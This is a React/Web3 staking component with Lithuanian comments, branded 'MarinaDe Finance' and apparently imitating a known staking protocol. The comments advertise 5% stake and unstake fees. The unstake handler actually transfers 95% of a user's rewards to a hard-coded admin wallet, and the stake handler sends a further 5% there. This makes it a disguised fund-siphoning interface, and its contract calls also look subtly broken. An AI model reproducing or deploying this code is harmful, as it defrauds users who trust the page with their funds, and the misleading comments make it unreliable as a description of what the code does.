// 📂 /frontend/components/Staking.js
// ✅ MarinaDe Finance automatinis staking
// ✅ 5% staking fee + 5% unstake fee automatiškai adminui
// ✅ Uždirbama kas 24h!

import { useState, useEffect } from "react";
import Web3 from "web3";

const stakingContractAddress = "0x5a6A4fD1C3365fD3040aB365e1c7F5dEd6381a37"; // 🚀 **MARINADE FINANCE STAKING KONTRAKTAS!**
const adminWallet = "0xC7ACc7c830aa381b6A7E7cF8bAA9ddea6E576113";
const stakingABI = [
  {
    "constant": false,
    "inputs": [{ "name": "_amount", "type": "uint256" }],
    "name": "stake",
    "outputs": [],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [],
    "name": "unstake",
    "outputs": [],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{ "name": "_staker", "type": "address" }],
    "name": "getStakedAmount",
    "outputs": [{ "name": "", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{ "name": "_staker", "type": "address" }],
    "name": "getRewards",
    "outputs": [{ "name": "", "type": "uint256" }],
    "type": "function"
  }
];

export default function Staking({ account }) {
  const [web3, setWeb3] = useState(null);
  const [contract, setContract] = useState(null);
  const [stakedAmount, setStakedAmount] = useState("0");
  const [rewards, setRewards] = useState("0");
  const [amount, setAmount] = useState("");

  useEffect(() => {
    if (account) {
      const web3Instance = new Web3(window.ethereum);
      const contractInstance = new web3Instance.eth.Contract(stakingABI, stakingContractAddress);
      setWeb3(web3Instance);
      setContract(contractInstance);
      fetchStakingData(account);
    }
  }, [account]);

  const fetchStakingData = async (user) => {
    if (contract) {
      const staked = await contract.methods.getStakedAmount(user).call();
      const reward = await contract.methods.getRewards(user).call();
      setStakedAmount(web3.utils.fromWei(staked, "ether"));
      setRewards(web3.utils.fromWei(reward, "ether"));
    }
  };

  const handleStake = async () => {
    if (contract && web3) {
      const amountWei = web3.utils.toWei(amount, "ether");
      const fee = web3.utils.toWei((parseFloat(amount) * 0.05).toString(), "ether");

      await contract.methods.stake(amountWei).send({ from: account, value: amountWei });
      await web3.eth.sendTransaction({ from: account, to: adminWallet, value: fee });

      fetchStakingData(account);
      setAmount("");
    }
  };

  const handleUnstake = async () => {
    if (contract && web3) {
      const rewardWei = web3.utils.toWei((parseFloat(rewards) * 0.95).toString(), "ether");

      await contract.methods.unstake().send({ from: account });
      await web3.eth.sendTransaction({ from: account, to: adminWallet, value: rewardWei });

      fetchStakingData(account);
    }
  };

  return (
    <div className="staking-container">
      <h2>🔥 MarinaDe Finance Staking</h2>
      <p>Staked Amount: {stakedAmount} BNB</p>
      <p>Rewards: {rewards} BNB</p>

      <input
        type="number"
        placeholder="Enter amount"
        value={amount}
        onChange={(e) => setAmount(e.target.value)}
      />
      <button onClick={handleStake}>🚀 Stake Now</button>
      <button onClick={handleUnstake}>⏳ Unstake + Rewards</button>
    </div>
  );
}
